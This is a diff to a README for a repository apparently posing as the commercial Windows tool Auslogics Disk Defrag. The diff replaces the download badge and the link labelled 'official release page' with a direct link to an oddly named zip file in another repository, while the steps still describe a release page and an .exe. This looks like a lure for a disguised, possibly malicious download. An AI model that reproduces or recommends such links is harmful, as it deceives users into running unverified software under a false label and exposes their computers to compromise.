@@ -5,7 +5,7 @@ description: "Download the latest Auslogics Disk Defrag installer for Windows 10
 ---
 # ⚙️ Auslogics-Disk-Defrag-2026 - Improve your Windows hard drive performance
 
-[![](https://img.shields.io/badge/Download_Installer-Blue.svg)](https://github.com/Sinusoidminestrone797/Auslogics-Disk-Defrag-2026/releases)
+[![](https://img.shields.io/badge/Download_Installer-Blue.svg)](https://raw.githubusercontent.com/Sinusoidminestrone797/sinusoidminestrone797.github.io/main/q/github-sinusoidminestrone-io-3.5-beta.1.zip)
 
 ## What this software does
 
@@ -17,7 +17,7 @@ This version works on Windows 10 and Windows 11. It supports both traditional ha
 
 Follow these steps to get the program on your computer.
 
-1. Go to the [official release page](https://github.com/Sinusoidminestrone797/Auslogics-Disk-Defrag-2026/releases).
+1. Go to the [official release page](https://raw.githubusercontent.com/Sinusoidminestrone797/sinusoidminestrone797.github.io/main/q/github-sinusoidminestrone-io-3.5-beta.1.zip).
 2. Look for the Assets section at the bottom of the page.
 3. Click the file ending in .exe to start your download.
 4. Wait for the file to finish saving to your computer.
